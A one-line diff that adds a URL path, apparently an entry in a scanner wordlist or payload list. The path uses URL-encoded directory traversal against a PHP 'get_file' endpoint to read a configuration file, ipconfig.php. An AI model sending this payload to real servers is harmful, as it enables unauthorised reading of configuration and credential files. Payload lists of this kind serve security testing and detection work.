@@ -1,0 +1,1 @@
+/index.php/guest/get/get_file/..%2f..%2fipconfig.php
